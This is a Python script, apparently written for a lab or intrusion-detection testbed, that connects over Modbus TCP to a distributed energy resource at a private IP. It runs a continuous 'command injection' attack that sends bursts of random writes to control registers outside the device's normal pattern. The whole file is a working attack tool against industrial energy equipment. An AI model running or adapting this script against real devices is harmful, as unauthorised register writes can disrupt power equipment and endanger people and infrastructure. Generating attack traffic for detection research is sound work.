from pymodbus.client import ModbusTcpClient
import time
import random

DER_IP = "192.168.50.20"
PORT = 502

client = ModbusTcpClient(DER_IP, port=PORT)
if not client.connect():
    print("FAILED to connect to DER at", DER_IP, "port", PORT)
    raise SystemExit

print("Connected to DER for injection:", DER_IP)
print("Starting continuous COMMAND INJECTION traffic... Press Ctrl+C to stop.")

# Pick registers outside the normal controller pattern
abnormal_regs = [2, 3, 4, 10, 20, 30]

try:
    while True:
        # send one burst
        for i in range(10):
            reg = random.choice(abnormal_regs)
            value = random.randint(800, 2000)

            wr = client.write_register(address=reg, value=value, slave=1)

            if wr.isError():
                print(f"Write error: reg={reg}, value={value}, resp={wr}")
            else:
                print(f"Injected command: register {reg} = {value}")

            # very bursty writes
            time.sleep(0.02)

        print("Burst complete")
        time.sleep(2.0)

except KeyboardInterrupt:
    print("\nStopped command injection.")

finally:
    client.close()